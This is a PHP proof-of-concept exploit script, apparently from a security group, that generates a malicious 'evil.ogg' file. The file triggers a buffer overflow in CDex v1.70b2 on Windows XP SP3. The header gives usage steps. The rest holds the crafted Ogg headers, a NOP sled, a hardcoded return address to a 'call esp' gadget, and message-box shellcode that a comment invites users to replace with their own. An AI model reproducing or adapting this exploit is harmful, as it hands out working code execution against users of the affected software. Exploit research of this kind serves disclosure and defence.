<?PHP
/*
CDex v1.70b2 (.ogg) local buffer overflow exploit poc (win xp sp3)
by Nine:Situations:Group::Pyrokinesis

software site: http://cdexos.sourceforge.net/
our site: http://retrogod.altervista.org/

A very reliable buffer overflow exists in the way cdex process Ogg Vorbis Info
headers.
usage:
c:\php\php 9sg_cdex_local.php
evil.ogg is created, now navigate:
Main Menu-> Tools -> Media file Player -> Select files -> Browse to a folder ->
-> Open -> Play evil.ogg
*/

$_frgmnt1 =
"OggS".                             //for what I understood ... beginning
"\x00".                             //stream_structure_version
"\x02".                             //header_type_flag
"\x00\x00\x00\x00\x00\x00\x00\x00". //granular_position
"\x66\x07\x00\x00".                 //bitstream_serial_number
"\x00\x00\x00\x00".                 //page_sequence_number
"\x92\xa8\x3b\xd9".                 //CRC_checksum
"\x01".                             //number_page_segments
"\x1e".                             //segments_table
"\x01".
"vorbis".
"\x00\x00\x00\x00\x02\x44\xac\x00\x00\x00\x00\x00\x00".
"\x00\x71\x02\x00\x00\x00\x00\x00\xb8\x01";

$_frgmnt2 =
"OggS".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x66\x07".
"\x00\x00\x01\x00\x00\x00".
"\x00\x00\x00\x00". //set crc to 0, after calculate the real crc
"\x51\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\x93\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\xff\x03vorbis\x1d\x00\x00".
"\x00Xiph.Org\x20libVor".
"bis\x20I\x2020040629\x03\x00".
"\x00\x00\x07\x20\x00\x00".
"ARTIST=";

$payload_len=8192;

//msg box shellcode saying "hey" ...
//replace with your own, the script recalculates the CRC checksum
$scode =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a".
"\xbb\x7b\x1d\x80\x7c". //LoadLibraryA at 0x7c801d7b in kernel32.dll  xpsp3
"\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50".
"\xbb\x30\xae\x80\x7c". //GetProcAddress at 0x7c80ae30 in kernel32.dll
"\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x03\x31\xd2\x52\x51".
"\x51\x52\xff\xd0\x31\xd2\x50".
"\xb8\xfa\xca\x81\x7c". //ExitProcess at 0x7c81cafa in kernel32.dll
"\xff\xd0\xe8\xc4\xff".
"\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff".
"\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff".
"\xff\x48\x65\x79\x4e";

$_boom=str_repeat("\x90",2048 - strlen($scode)).$scode.
"\x67\x86\x86\x7c".  //eip -> 0x7C868667      call esp kernel32.dll
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90".
"\x83\xec\x7f". // sub esp,07f
"\x83\xec\x7f". //..
"\x83\xec\x7f". //..
"\x83\xec\x7f". //..
"\x83\xec\x7f". //..
"\xff\xd4". //call esp
"\x90\x90\x90".
"\x00\x00\x00\x00";//if replaced with non-zero chars, overwrites seh ... do not touch

$_frgmnt2.=$_boom."\x90\x90\x90\x90\x90\x90\x90\x90".str_repeat("\x90",$payload_len - strlen($_boom) - 8);
$_frgmnt2.="\x0a\x20\x00\x00".
"PERFORMER=";
$_frgmnt2.=str_repeat("\x90",$payload_len);
$_frgmnt2.="\x09\x00\x00\x00".
"DATE=2009".
"\x01\x05".
"vorbis".
"\x29\x42\x43\x56\x01\x00\x08\x00\x00\x00\x31\x4c\x20\xc5\x80\xd0".
"\x90\x55\x00\x00\x10\x00\x00".
"\x60\x24\x29\x0e\x93\x66\x49\x29\xa5".
"\x94\xa1\x28\x79\x98\x94\x48\x49\x29\xa5\x94\xc5\x30\x89\x98\x94".
"\x89\xc5\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x20".
"\x34\x64\x15\x00\x00\x04\x00\x80\x28\x09\x8e\xa3\xe6\x49\x6a\xce".
"\x39\x67\x18\x27\x8e\x72\xa0\x39\x69\x4e\x38\xa7\x20\x07\x8a\x51".
"\xe0\x39\x09\xc2\xf5\x26\x63\x6e\xa6\xb4\xa6\x6b\x6e\xce\x29\x25".
"\x08\x0d\x59\x05\x00\x00\x02\x00\x40\x48\x21\x85\x14\x52\x48\x21".
"\x85\x14\x62\x88\x21\x86\x18\x62\x88\x21\x87\x1c\x72\xc8\x21\xa7".
"\x9c\x72\x0a\x2a\xa8\xa0\x82\x0a\x32\xc8\x20\x83\x4c\x32\xe9\xa4".
"\x93\x4e\x3a\xe9\xa8\xa3\x8e\x3a\xea\x28\xb4\xd0\x42\x0b\x2d\xb4".
"\xd2\x4a\x4c\x31\xd5\x56\x63\xae\xbd\x06\x5d\x7c\x73\xce\x39\xe7".
"\x9c\x73\xce\x39\xe7\x9c\x73\xce\x09\x42\x43\x56\x01\x00\x20\x00".
"\x00\x04\x42\x06\x19\x64\x10\x42\x08\x21\x85\x14\x52\x88\x29\xa6".
"\x98\x72\x0a\x32\xc8\x80\xd0\x90\x55\x00\x00\x20\x00\x80\x00\x00".
"\x00\x00\x47\x91\x14\x49\xb1\x14\xcb\xb1\x1c\xcd\xd1\x24\x4f\xf2".
"\x2c\x51\x13\x35\xd1\x33\x45\x53\x54\x4d\x55\x55\x55\x55\x75\x5d".
"\x57\x76\x65\xd7\x76\x75\xd7\x76\x7d\x59\x98\x85\x5b\xb8\x7d\x59".
"\xb8\x85\x5b\xd8\x85\x5d\xf7\x85\x61\x18\x86\x61\x18\x86\x61\x18".
"\x86\x61\xf8\x7d\xdf\xf7\x7d\xdf\xf7\x7d\x20\x34\x64\x15\x00\x20".
"\x01\x00\xa0\x23\x39\x96\xe3\x29\xa2\x22\x1a\xa2\xe2\x39\xa2\x03".
"\x84\x86\xac\x02\x00\x64\x00\x00\x04\x00\x20\x09\x92\x22\x29\x92".
"\xa3\x49\xa6\x66\x6a\xae\x69\x9b\xb6\x68\xab\xb6\x6d\xcb\xb2\x2c".
"\xcb\xb2\x0c\x84\x86\xac\x02\x00\x00\x01\x00\x04\x00\x00\x00\x00".
"\x00\xa0\x69\x9a\xa6\x69\x9a\xa6\x69\x9a\xa6\x69\x9a\xa6\x69\x9a".
"\xa6\x69\x9a\xa6\x69\x9a\x66\x59\x96\x65\x59\x96\x65\x59\x96\x65".
"\x59\x96\x65\x59\x96\x65\x59\x96\x65\x59\x96\x65\x59\x96\x65\x59".
"\x96\x65\x59\x96\x65\x59\x96\x65\x59\x96\x65\x59\x40\x68\xc8\x2a".
"\x00\x40\x02\x00\x40\xc7\x71\x1c\xc7\x71\x24\x45\x52\x24\xc7\x72".
"\x2c\x07\x08\x0d\x59\x05\x00\xc8\x00\x00\x08\x00\x40\x52\x2c\xc5".
"\x72\x34\x47\x73\x34\xc7\x73\x3c\xc7\x73\x3c\x47\x74\x44\xc9\x94".
"\x4c\xcd\xf4\x4c\x0f\x08\x0d\x59\x05\x00\x00\x02\x00\x08\x00\x00".
"\x00\x00\x00\x40\x31\x1c\xc5\x71\x1c\xc9\xd1\x24\x4f\x52\x2d\xd3".
"\x72\x35\x57\x73\x3d\xd7\x73\x4d\xd7\x75\x5d\x57\x55\x55\x55\x55".
"\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55".
"\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x81\xd0".
"\x90\x55\x00\x00\x04\x00\x00\x21\x9d\x66\x96\x6a\x80\x08\x33\x90".
"\x61\x20\x34\x64\x15\x00\x80\x00\x00\x00\x18\xa1\x08\x43\x0c\x08".
"\x0d\x59\x05\x00\x00\x04\x00\x00\x88\xa1\xe4\x20\x9a\xd0\x9a\xf3".
"\xcd\x39\x0e\x9a\xe5\xa0\xa9\x14\x9b\xd3\xc1\x89\x54\x9b\x27\xb9".
"\xa9\x98\x9b\x73\xce\x39\xe7\x9c\x6c\xce\x19\xe3\x9c\x73\xce\x29".
"\xca\x99\xc5\xa0\x99\xd0\x9a\x73\xce\x49\x0c\x9a\xa5\xa0\x99\xd0".
"\x9a\x73\xce\x79\x12\x9b\x07\xad\xa9\xd2\x9a\x73\xce\x19\xe7\x9c".
"\x0e\xc6\x19\x61\x9c\x73\xce\x69\xd2\x9a\x07\xa9\xd9\x58\x9b\x73".
"\xce\x59\xd0\x9a\xe6\xa8\xb9\x14\x9b\x73\xce\x89\x94\x9b\x27\xb5".
"\xb9\x54\x9b\x73\xce\x39\xe7\x9c\x73\xce\x39\xe7\x9c\x73\xce\xa9".
"\x5e\x9c\xce\xc1\x39\xe1\x9c\x73\xce\x89\xda\x9b\x6b\xb9\x09\x5d".
"\x9c\x73\xce\xf9\x64\x9c\xee\xcd\x09\xe1\x9c\x73\xce\x39\xe7\x9c".
"\x73\xce\x39\xe7\x9c\x73\xce\x09\x42\x43\x56\x01\x00\x40\x00\x00".
"\x04\x61\xd8\x18\xc6\x9d\x82\x20\x7d\x8e\x06\x62\x14\x21\xa6\x21".
"\x93\x1e\x74\x8f\x0e\x93\xa0\x31\xc8\x29\xa4\x1e\x8d\x8e\x46\x4a".
"\xa9\x83\x50\x52\x19\x27\xa5\x74\x82\xd0\x90\x55\x00\x00\x20\x00".
"\x00\x84\x10\x52\x48\x21\x85\x14\x52\x48\x21\x85\x14\x52\x48\x21".
"\x86\x18\x62\x88\x21\xa7\x9c\x72\x0a\x2a\xa8\xa4\x92\x8a\x2a\xca".
"\x28\xb3\xcc\x32\xcb\x2c\xb3\xcc\x32\xcb\xac\xc3\xce\x3a\xeb\xb0".
"\xc3\x10\x43\x0c\x31\xb4\xd2\x4a\x2c\x35\xd5\x56\x63\x8d\xb5\xe6".
"\x9e\x73\xae\x39\x48\x6b\xa5\xb5\xd6\x5a\x2b\xa5\x94\x52\x4a\x29".
"\xa5\x20\x34\x64\x15\x00\x00\x02\x00\x40\x20\x64\x90\x41\x06\x19".
"\x85\x14\x52\x48\x21\x86\x98\x72\xca\x29\xa7\xa0\x82\x0a\x08\x0d".
"\x59\x05\x00\x00\x02\x00\x08\x00\x00\x00\xf0\x24\xcf\x11\x1d\xd1".
"\x11\x1d\xd1\x11\x1d\xd1\x11\x1d\xd1\x11\x1d\xcf\xf1\x1c\x51\x12".
"\x25\x51\x12\x25\xd1\x32\x2d\x53\x33\x3d\x55\x54\x55\x57\x76\x6d".
"\x59\x97\x75\xdb\xb7\x85\x5d\xd8\x75\xdf\xd7\x7d\xdf\xd7\x8d\x5f".
"\x17\x86\x65\x59\x96\x65\x59\x96\x65\x59\x96\x65\x59\x96\x65\x59".
"\x96\x65\x09\x42\x43\x56\x01\x00\x20\x00\x00\x00\x42\x08\x21\x84".
"\x14\x52\x48\x21\x85\x94\x62\x8c\x31\xc7\x9c\x83\x4e\x42\x09\x81".
"\xd0\x90\x55\x00\x00\x20\x00\x80\x00\x00\x00\x00\x47\x71\x14\xc7".
"\x91\x1c\xc9\x91\x24\x4b\xb2\x24\x4d\xd2\x2c\xcd\xf2\x34\x4f\xf3".
"\x34\xd1\x13\x45\x51\x34\x4d\x53\x15\x5d\xd1\x15\x75\xd3\x16\x65".
"\x53\x36\x5d\xd3\x35\x65\xd3\x55\x65\xd5\x76\x65\xd9\xb6\x65\x5b".
"\xb7\x7d\x59\xb6\x7d\xdf\xf7\x7d\xdf\xf7\x7d\xdf\xf7\x7d\xdf\xf7".
"\x7d\xdf\xd7\x75\x20\x34\x64\x15\x00\x20\x01\x00\xa0\x23\x39\x92".
"\x22\x29\x92\x22\x39\x8e\xe3\x48\x92\x04\x84\x86\xac\x02\x00\x64".
"\x00\x00\x04\x00\xa0\x28\x8e\xe2\x38\x8e\x23\x49\x92\x24\x59\x92".
"\x26\x79\x96\x67\x89\x9a\xa9\x99\x9e\xe9\xa9\xa2\x0a\x84\x86\xac".
"\x02\x00\x00\x01\x00\x04\x00\x00\x00\x00\x00\xa0\x68\x8a\xa7\x98".
"\x8a\xa7\x88\x8a\xe7\x88\x8e\x28\x89\x96\x69\x89\x9a\xaa\xb9\xa2".
"\x6c\xca\xae\xeb\xba\xae\xeb\xba\xae\xeb\xba\xae\xeb\xba\xae\xeb".
"\xba\xae\xeb\xba\xae\xeb\xba\xae\xeb\xba\xae\xeb\xba\xae\xeb\xba".
"\xae\xeb\xba\xae\xeb\xba\x40\x68\xc8\x2a\x00\x40\x02\x00\x40\x47".
"\x72\x24\x47\x72\x24\x45\x52\x24\x45\x72\x24\x07\x08\x0d\x59\x05".
"\x00\xc8\x00\x00\x08\x00\xc0\x31\x1c\x43\x52\x24\xc7\xb2\x2c\x4d".
"\xf3\x34\x4f\xf3\x34\xd1\x13\x3d\xd1\x33\x3d\x55\x74\x45\x17\x08".
"\x0d\x59\x05\x00\x00\x02\x00\x08\x00\x00\x00\x00\x00\xc0\x90\x0c".
"\x4b\xb1\x1c\xcd\xd1\x24\x51\x52\x2d\xd5\x52\x35\xd5\x52\x2d\x55".
"\x54\x3d\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55".
"\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55".
"\x55\x55\x55\xd5\x34\x4d\xd3\x34\x81\xd0\x90\x95\x00\x00\x19\x00".
"\x00\xe4\xa4\xa6\xd4\x7a\x0e\x12\x62\x90\x39\x89\x41\x68\x08\x49".
"\xc4\x1c\xc5\x5c\x3a\xe9\x9c\xa3\x5c\x8c\x87\x90\x23\x46\x49\xed".
"\x21\x53\xcc\x10\x04\xb5\x98\xd0\x49\x85\x14\xd4\xe2\x5a\x6a\x1d".
"\x73\x54\x8b\x8d\xad\x64\x48\x41\x2d\xb6\xc6\x52\x21\xe5\xa8\x07".
"\x42\x43\x56\x08\x00\xa1\x19\x00\x0e\xc7\x01\x1c\x4d\x03\x1c\x4b".
"\x03\x00\x00\x00\x00\x00\x00\x00\x49\xd3\x00\x4d\x14\x01\xcd\x13".
"\x01\x00\x00\x00\x00\x00\x00\xc0\xd1\x34\x40\x13\x3d\x40\x13\x45".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x1c\x4d\x03\x34\x51\x04\x34\x51\x04\x00\x00\x00".
"\x00\x00\x00\x00\x4d\x14\x01\xd1\x54\x01\xd1\x34\x01\x00\x00\x00".
"\x00\x00\x00\x40\x13\x45\xc0\x33\x45\x40\x34\x55\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x1c\x4d\x03\x34\x51\x04\x34\x51\x04\x00\x00\x00\x00\x00\x00\x00".
"\x4d\x14\x01\x51\x35\x01\x4f\x34\x01\x00\x00\x00\x00\x00\x00\x40".
"\x13\x45\x40\x34\x4d\x40\x54\x4d\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01".
"\x00\x00\x01\x0e\x00\x00\x01\x16\x42\xa1\x21\x2b\x02\x80\x38\x01".
"\x00\x87\xe3\x40\x92\x20\x49\xf0\x34\x80\x63\x59\xf0\x3c\x78\x1a".
"\x4c\x13\xe0\x58\x16\x3c\x0f\x9a\x07\xd3\x04\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x40\xf2\x34\x78\x1e\x3c\x0f\xa6\x09\x90\x34\x0f".
"\x9e\x07\xcf\x83\x69\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\x79\x1e\x3c\x0f\x9e\x07\xd3\x04\x48\x9e\x07\xcf\x83\xe7\xc1\x34".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x4c\x13\xa6\x09\xd1".
"\x84\x6a\x02\x3c\xd3\x84\x69\xc2\x34\x61\xaa\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x80\x00\x00\x80\x01\x07\x00\x80\x00\x13\xca\x40\xa1\x21\x2b".
"\x02\x80\x38\x01\x00\x87\xa3\x48\x12\x00\x00\x38\x92\x64\x59\x00".
"\x00\xa0\x48\x92\x65\x01\x00\x80\x65\x59\x9e\x07\x00\x00\x92\x65".
"\x79\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x80\x00\x00\x80\x01\x07\x00\x80\x00\x13\xca\x40\xa1\x21".
"\x2b\x01\x80\x28\x00\x00\x87\xa2\x58\x16\x70\x1c\xcb\x02\x8e\x63".
"\x59\x40\x92\x2c\x0b\x60\x59\x00\x4d\x03\x78\x1a\x40\x14\x01\x80".
"\x00\x00\x80\x02\x07\x00\x80\x00\x1b\x34\x25\x16\x07\x28\x34\x64".
"\x25\x00\x10\x05\x00\xe0\x70\x14\xcb\xd2\x34\x51\xe4\x38\x96\xa5".
"\x69\xa2\xc8\x71\x2c\x4b\xd3\x44\x91\x65\x69\x9a\xa6\x89\x22\x34".
"\x4b\xd3\x44\x11\x9e\xe7\x79\xa6\x09\xcf\xf3\x3c\xd3\x84\x28\x8a".
"\xa2\x69\x02\x51\x34\x4d\x01\x00\x00\x05\x0e\x00\x00\x01\x36\x68".
"\x4a\x2c\x0e\x50\x68\xc8\x4a\x00\x20\x24\x00\xc0\xe1\x38\x96\xe5".
"\x79\xa2\x28\x8a\xa6\x69\x9a\xaa\xca\x71\x2c\xcb\xf3\x44\x51\x14".
"\x4d\x53\x55\x5d\x97\xe3\x58\x96\xe7\x89\xa2\x28\x9a\xa6\xaa\xba".
"\x2e\xcb\xd2\x34\xcf\x13\x45\x51\x34\x4d\x55\x75\x5d\x68\x9a\xe7".
"\x89\xa2\x28\x9a\xa6\xaa\xba\x2e\x34\x4d\x14\x4d\xd3\x34\x55\x55".
"\x55\x5d\x17\x9a\xe6\x89\xa6\x69\x9a\xaa\xaa\xaa\xae\x0b\xcf\x13".
"\x45\xd3\x34\x4d\x55\x75\x5d\xd7\x05\xa2\x68\x9a\xa6\xa9\xaa\xae".
"\xeb\xba\x40\x14\x4d\xd3\x34\x55\xd5\x75\x5d\x17\x88\xa2\x68\x9a".
"\xa6\xaa\xba\xae\xeb\x02\xd3\x34\x4d\x55\x55\x5d\xd7\x95\x65\x80".
"\x69\xaa\xaa\xaa\xba\xae\x2c\x03\x54\x55\x55\x5d\xd7\x95\x65\x19".
"\xa0\xaa\xaa\xea\xba\xae\x2b\xcb\x00\xd7\x75\x5d\xd9\x95\x65\x59".
"\x06\xe0\xba\xae\x2b\xcb\xb2\x2c\x00\x00\xe0\xc0\x01\x00\x20\xc0".
"\x08\x3a\xc9\xa8\xb2\x08\x1b\x4d\xb8\xf0\x00\x14\x1a\xb2\x22\x00".
"\x88\x02\x00\x00\x8c\x61\x4a\x31\xa5\x0c\x63\x12\x42\x0a\xa1\x61".
"\x4c\x42\x48\x21\x64\x52\x52\x2a\x29\xa5\x0a\x42\x2a\x25\x95\x52".
"\x41\x48\xa5\xa4\x52\x32\x4a\x2d\xa5\x96\x52\x05\x21\x95\x92\x4a".
"\xa9\x20\xa4\x52\x52\x29\x05\x00\x80\x1d\x38\x00\x80\x1d\x58\x08".
"\x85\x86\xac\x04\x00\xf2\x00\x00\x08\x63\x94\x62\xcc\x39\xe7\x24".
"\x42\x4a\x31\xe6\x9c\x73\x12\x21\xa5\x18\x73\xce\x39\xa9\x14\x63".
"\xce\x39\xe7\x9c\x94\x92\x31\xe7\x9c\x73\x4e\x4a\xc9\x98\x73\xce".
"\x39\x27\xa5\x64\xcc\x39\xe7\x9c\x93\x52\x3a\xe7\x9c\x73\x0e\x4a".
"\x29\xa5\x74\xce\x39\xe7\xa4\x94\x52\x42\xe8\x9c\x73\x52\x4a\x29".
"\x9d\x73\xce\x39\x01\x00\x40\x05\x0e\x00\x00\x01\x36\x8a\x6c\x4e".
"\x30\x12\x54\x68\xc8\x4a\x00\x20\x15\x00\xc0\xe0\x38\x96\xa5\x69".
"\x9e\x27\x8a\xa6\x69\x49\x92\xa6\x79\x9e\x27\x9a\xa6\x69\x6a\x92".
"\xa4\x69\x9e\x27\x8a\xa6\x69\x9a\x3c\xcf\xf3\x44\x51\x14\x4d\x53".
"\x55\x79\x9e\xe7\x89\xa2\x28\x9a\xa6\xaa\x72\x5d\x51\x14\x4d\xd3".
"\x34\x4d\x55\x25\xcb\xa2\x28\x8a\xa6\xa9\xaa\xaa\x0a\xd3\x34\x4d".
"\xd3\x54\x55\x55\x85\x69\x9a\xa6\x69\xaa\xaa\xeb\xc2\xb6\x55\x55".
"\x55\x5d\xd7\x75\x61\xdb\xaa\xaa\xaa\xae\xeb\xba\xc0\x75\x5d\xd7".
"\x75\x65\x19\xb8\xae\xeb\xba\xae\x2c\x0b\x00\x00\x4f\x70\x00\x00".
"\x2a\xb0\x61\x75\x84\x93\xa2\xb1\xc0\x42\x43\x56\x02\x00\x19\x00".
"\x00\x84\x31\x08\x29\x84\x10\x52\x06\x21\xa4\x10\x42\x48\x29\x85".
"\x90\x00\x00\x80\x01\x07\x00\x80\x00\x13\xca\x40\xa1\x21\x2b\x01".
"\x80\x70\x00\x00\x80\x10\x8c\x31\xc6\x18\x63\x8c\x31\x36\x8c\x61".
"\x8c\x31\xc6\x18\x63\x8c\x31\x71\x0a\x63\x8c\x31\xc6\x18\x63\x8c".
"\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31".
"\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6".
"\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18".
"\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63".
"\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c".
"\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31".
"\xc6\x18\x63\x8c\x31\xc6\x18\x63\x8c\x31\xc6\xd8\x5a\x6b\xad\xb5".
"\x56\x00\x18\xce\x85\x03\x40\x59\x84\x8d\x33\xac\x24\x9d\x15\x8e".
"\x06\x17\x1a\xb2\x12\x00\x08\x09\x00\x00\x8c\x41\x88\x31\xe8\x24".
"\x94\x92\x4a\x4a\x15\x42\x8c\x39\x28\x25\x95\x96\x5a\x8a\xad\x42".
"\x88\x31\x08\xa5\xa4\xd4\x5a\x6c\x31\x16\xcf\x39\x07\xa1\xa4\x94".
"\x5a\x8a\x29\xb6\xe2\x39\xe7\xa4\xa4\xd4\x5a\x8c\x31\xc6\x5a\x5c".
"\x0b\x21\xa5\x94\x5a\x8b\x2d\xb6\x18\x9b\x6c\x21\xa4\x94\x52\x6b".
"\x31\xc6\x5a\x63\x33\x4a\xb5\x94\x5a\x8b\x31\xc6\x18\x6b\x2c\x4a".
"\xb9\x94\x52\x6b\xb1\xc5\x18\x6b\x8d\x45\x28\x9b\x5b\x6b\x31\xc6".
"\x5a\x6b\xad\x35\x29\xe5\x73\x4b\xb1\xd5\x5a\x63\xac\xb5\x26\xa3".
"\x8c\x92\x31\xc6\x5a\x6b\xac\xb5\xd6\x22\x94\x52\x32\xc6\x14\x53".
"\xac\xb5\xd6\x9a\x84\x30\xc6\xf7\x18\x63\xac\x31\xe7\x5a\x93\x12".
"\xc2\xf8\x1e\x53\x2d\xb1\xd5\x5a\x6b\x52\x4a\x29\x23\x64\x8d\xa9".
"\xc6\x5a\x73\x4e\x4a\x09\x65\x8c\x8d\x2d\xd5\x94\x73\xce\x05\x00".
"\x40\x3d\x38\x00\x40\x25\x18\x41\x27\x19\x55\x16\x61\xa3\x09\x17".
"\x1e\x80\x42\x43\x56\x02\x00\xb9\x01\x00\x08\x42\x4a\x31\xc6\x98".
"\x73\xce\x39\xe7\x9c\x73\x0e\x52\xa4\x18\x73\xcc\x39\xe7\x20\x84".
"\x10\x42\x08\x21\xa4\x08\x31\xc6\x98\x73\xce\x41\x08\x21\x84\x10".
"\x42\x48\x19\x63\xcc\x39\xe7\x20\x84\x10\x42\x08\xa1\x84\x92\x52".
"\xca\x98\x73\xce\x41\x08\x21\x84\x52\x4a\x29\x25\xa5\xd4\x39\xe7".
"\x20\x84\x10\x42\x28\xa5\x94\x52\x4a\x4a\xa9\x73\xce\x41\x08\x21".
"\x84\x52\x4a\x29\xa5\x94\x94\x52\x08\x21\x84\x10\x42\x08\xa5\x94".
